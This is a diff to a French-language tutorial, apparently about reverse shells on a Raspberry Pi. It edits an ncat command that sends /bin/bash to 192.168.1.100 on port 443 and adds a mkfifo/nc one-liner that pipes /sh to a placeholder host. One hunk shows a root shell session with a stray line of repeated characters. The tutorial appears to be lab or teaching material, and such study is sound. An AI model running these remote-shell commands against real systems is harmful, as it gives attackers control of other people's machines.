@@ -47,9 +47,13 @@ Listening on 0.0.0.0 443
 Machine cible
 
 ```shell
-root@raspberrypi:/# ncat 192.168.1.100 443 -e /bin/bash
+user@raspberrypi: ~$ ncat 192.168.1.100 443 -e /bin/bash
 ```
-
+ou
+```shell
+user@raspberrypi: ~$ mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+```
+si ncat ne prends pas en paramètre -e
 
 **Execution du script**.
 
@@ -203,4 +207,3 @@ root@raspberrypi:/home/user# stty rows 30
 root@raspberrypi:/home/user# stty columns 120
 root@raspberrypi:/home/user# jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
 ```
-
